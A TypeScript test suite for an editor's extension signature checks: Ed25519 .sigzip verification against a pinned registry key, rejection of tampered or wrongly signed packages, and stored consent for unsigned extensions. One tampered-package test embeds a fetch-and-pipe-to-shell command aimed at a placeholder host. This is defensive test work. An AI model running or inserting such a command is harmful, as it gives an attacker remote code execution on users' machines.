/*---------------------------------------------------------------------------------------------
 *  Copyright (c) Volt ADK. All rights reserved.
 *  Licensed under the MIT License. See License.txt in the project root for license information.
 *--------------------------------------------------------------------------------------------*/

import assert from 'assert';
import * as crypto from 'crypto';
import * as fs from 'fs';
import { tmpdir } from 'os';
import { join } from '../../../../base/common/path.js';
import { IFile, zip } from '../../../../base/node/zip.js';
import { ensureNoDisposablesAreLeakedInTestSuite } from '../../../../base/test/common/utils.js';
import { NullLogService } from '../../../log/common/log.js';
import { IProductService } from '../../../product/common/productService.js';
import { NullTelemetryService } from '../../../telemetry/common/telemetryUtils.js';
import { ExtensionSignatureVerificationCode } from '../../common/extensionManagement.js';
import { hasVoltRegistryPublicKeys, voltRegistryPublicKeys } from '../../common/voltExtensionSigning.js';
import { ExtensionSignatureVerificationService, verifyRegistrySignature } from '../../node/extensionSignatureVerificationService.js';
import { isConsentedUnsignedExtension, VoltUnsignedExtensionConsent } from '../../node/voltUnsignedExtensionConsent.js';

/** INV-29: Open VSX `.sigzip` signatures against the pinned registry key (SUP-6), and consent to unsigned extensions. */
suite('Volt extension signatures', () => {

	ensureNoDisposablesAreLeakedInTestSuite();

	let root: string;
	const registry = crypto.generateKeyPairSync('ed25519');
	const impostor = crypto.generateKeyPairSync('ed25519');
	const spki = (key: crypto.KeyObject) => key.export({ type: 'spki', format: 'der' }).toString('base64');
	const registryKey = spki(registry.publicKey);

	setup(async () => {
		root = await fs.promises.mkdtemp(join(tmpdir(), 'volt-sup6-'));
	});

	teardown(async () => {
		await fs.promises.rm(root, { recursive: true, force: true });
	});

	async function vsix(name: string, source = 'module.exports.activate = () => {};'): Promise<string> {
		return zip(join(root, `${name}.vsix`), [
			{ path: 'extension/package.json', contents: JSON.stringify({ name, publisher: 'pub', version: '1.0.0', main: './extension.js' }) },
			{ path: 'extension/extension.js', contents: source },
		]);
	}

	/** A signature archive as Open VSX writes it (node-ovsx-sign `sign`): Ed25519 over the whole .vsix. */
	async function sigzip(name: string, vsixPath: string, key: crypto.KeyObject, entries: { sig?: boolean } = {}): Promise<string> {
		const signature = crypto.sign(null, await fs.promises.readFile(vsixPath), key);
		const files: IFile[] = [
			{ path: '.signature.manifest', contents: JSON.stringify({ package: { size: 0, digests: { sha256: '' } }, entries: {} }) },
			{ path: '.signature.p7s', contents: '' },
		];
		if (entries.sig !== false) {
			files.unshift({ path: '.signature.sig', contents: signature });
		}
		return zip(join(root, `${name}.sigzip`), files);
	}

	function service(product: object): ExtensionSignatureVerificationService {
		return new ExtensionSignatureVerificationService(new NullLogService(), NullTelemetryService, { _serviceBrand: undefined, ...product } as unknown as IProductService);
	}

	const pinned = { extensionsGallery: { serviceUrl: 'https://open-vsx.org/vscode/gallery', voltRegistryPublicKeys: [registryKey] } };

	test('a package signed by the pinned registry key verifies', async () => {
		const pkg = await vsix('good');
		const sig = await sigzip('good', pkg, registry.privateKey);
		assert.strictEqual((await verifyRegistrySignature(pkg, sig, [registryKey])).code, ExtensionSignatureVerificationCode.Success);
		assert.strictEqual((await service(pinned).verify('pub.good', '1.0.0', pkg, sig))?.code, ExtensionSignatureVerificationCode.Success);
		// A rotated key list still accepts the package.
		assert.strictEqual((await verifyRegistrySignature(pkg, sig, [spki(impostor.publicKey), registryKey])).code, ExtensionSignatureVerificationCode.Success);
	});

	test('SUP-6: a tampered .vsix fails the registry signature check', async () => {
		const pkg = await vsix('tampered');
		const sig = await sigzip('tampered', pkg, registry.privateKey);
		// Repack with different code: same name, same signature archive.
		await fs.promises.rm(pkg);
		await vsix('tampered', 'require("child_process").exec("curl evil.example | sh");');
		assert.strictEqual((await verifyRegistrySignature(pkg, sig, [registryKey])).code, ExtensionSignatureVerificationCode.SignatureIsNotValid);
		assert.strictEqual((await service(pinned).verify('pub.tampered', '1.0.0', pkg, sig))?.code, ExtensionSignatureVerificationCode.SignatureIsNotValid);

		// One flipped byte is enough.
		const other = await vsix('flipped');
		const otherSig = await sigzip('flipped', other, registry.privateKey);
		const bytes = await fs.promises.readFile(other);
		bytes[bytes.length - 30] ^= 0xff;
		await fs.promises.writeFile(other, bytes);
		assert.strictEqual((await verifyRegistrySignature(other, otherSig, [registryKey])).code, ExtensionSignatureVerificationCode.SignatureIsNotValid);
	});

	test('SUP-6: a signature by another key, a missing signature and a broken archive are refused', async () => {
		const pkg = await vsix('signed-elsewhere');
		assert.strictEqual((await verifyRegistrySignature(pkg, await sigzip('impostor', pkg, impostor.privateKey), [registryKey])).code, ExtensionSignatureVerificationCode.SignatureIsNotValid);
		assert.strictEqual((await verifyRegistrySignature(pkg, await sigzip('nosig', pkg, registry.privateKey, { sig: false }), [registryKey])).code, ExtensionSignatureVerificationCode.SignatureIsMissing);
		const broken = join(root, 'broken.sigzip');
		await fs.promises.writeFile(broken, 'not a zip');
		assert.notStrictEqual((await verifyRegistrySignature(pkg, broken, [registryKey])).code, ExtensionSignatureVerificationCode.Success);
		const sig = await sigzip('good2', pkg, registry.privateKey);
		assert.strictEqual((await verifyRegistrySignature(join(root, 'missing.vsix'), sig, [registryKey])).code, ExtensionSignatureVerificationCode.PackageIsUnreadable);
		assert.strictEqual((await verifyRegistrySignature(pkg, sig, ['not a key'])).code, ExtensionSignatureVerificationCode.SignatureIsNotValid);
	});

	test('without pinned registry keys the registry check is not used', async () => {
		const pkg = await vsix('unpinned');
		const sig = await sigzip('unpinned', pkg, registry.privateKey);
		for (const product of [{}, { extensionsGallery: { serviceUrl: 'https://open-vsx.org/vscode/gallery' } }, { extensionsGallery: { serviceUrl: 'x', voltRegistryPublicKeys: [] } }]) {
			assert.strictEqual(hasVoltRegistryPublicKeys(product), false);
			// As before: vsce-sign decides (it isn't shipped, so nothing is verified).
			assert.notStrictEqual((await service(product).verify('pub.unpinned', '1.0.0', pkg, sig))?.code, ExtensionSignatureVerificationCode.Success);
		}
		assert.deepStrictEqual(voltRegistryPublicKeys({ extensionsGallery: { voltRegistryPublicKeys: [' ', registryKey] } }), [registryKey]);
	});

	test('consent to an unsigned extension is per extension, persisted, and never covers a bad signature', async () => {
		const file = join(root, 'user-data', 'volt-unsigned-extensions.json');
		const consent = new VoltUnsignedExtensionConsent(file);
		assert.strictEqual(await isConsentedUnsignedExtension(ExtensionSignatureVerificationCode.NotSigned, 'Pub.Unsigned', true, consent), false);
		await consent.grant('Pub.Unsigned', '1.0.0');

		const reloaded = new VoltUnsignedExtensionConsent(file);
		assert.strictEqual(await isConsentedUnsignedExtension(ExtensionSignatureVerificationCode.NotSigned, 'pub.unsigned', true, reloaded), true);
		assert.strictEqual(await isConsentedUnsignedExtension(ExtensionSignatureVerificationCode.NotSigned, 'pub.other', true, reloaded), false);
		assert.strictEqual(await isConsentedUnsignedExtension(ExtensionSignatureVerificationCode.SignatureIsNotValid, 'pub.unsigned', true, reloaded), false);
		assert.strictEqual(await isConsentedUnsignedExtension(ExtensionSignatureVerificationCode.SignatureIsMissing, 'pub.unsigned', true, reloaded), false);
		assert.strictEqual(await isConsentedUnsignedExtension(ExtensionSignatureVerificationCode.NotSigned, 'pub.unsigned', false, reloaded), false);
		assert.strictEqual((await fs.promises.stat(file)).mode & 0o777, 0o600);

		await fs.promises.writeFile(file, '{ broken');
		assert.strictEqual(await new VoltUnsignedExtensionConsent(file).has('pub.unsigned'), false);
	});
});
